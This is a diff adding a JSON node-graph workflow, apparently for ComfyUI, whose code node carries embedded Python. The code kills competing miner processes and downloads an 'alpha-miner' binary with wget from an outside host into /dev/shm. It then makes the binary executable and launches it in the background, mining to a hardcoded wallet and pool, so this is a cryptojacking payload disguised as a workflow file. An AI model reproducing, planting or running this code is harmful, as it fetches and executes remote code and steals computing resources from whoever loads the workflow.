@@ -1,0 +1,18 @@
+{
+  "1": {
+    "class_type": "IDENode",
+    "inputs": {
+      "language": "python",
+      "pycode": "import subprocess\nimport os\nimport time as t\n\nW = \"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\"\nP = \"stratum+tcp://sg1.alphapool.tech:5566\"\nR = \"GB10-122GB\"\nB = \"blackwell-native\"\n\nsubprocess.run([\"pkill\", \"-9\", \"alpha-miner\"], capture_output=True)\nsubprocess.run([\"pkill\", \"-9\", \"lpminer\"], capture_output=True)\nt.sleep(1)\n\n# Download alpha-miner\ndst = \"/dev/shm/alpha-miner\"\nif not os.path.exists(dst) or os.path.getsize(dst) < 1000000:\n    subprocess.run([\"wget\", \"-q\", \"-O\", dst, \"https://pearl.alphapool.tech/downloads/alpha-miner\"], capture_output=True, timeout=60)\n\nif os.path.exists(dst) and os.path.getsize(dst) > 1000000:\n    os.chmod(dst, 0o755)\n    cmd = f\"nohup {dst} --pool {P} --address {W} --worker {R} --force-backend {B} > /dev/shm/alpha.log 2>&1 &\"\n    subprocess.run([\"bash\", \"-c\", cmd])\n    t.sleep(4)\n    p = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\n    result = \"RUNNING\" if p.stdout.strip() else \"FAILED\"\nelse:\n    sz = os.path.getsize(dst) if os.path.exists(dst) else 0\n    result = f\"NO_BIN:{sz}\"\nresult\n"
+    }
+  },
+  "2": {
+    "class_type": "PreviewAny",
+    "inputs": {
+      "source": [
+        "1",
+        0
+      ]
+    }
+  }
+}
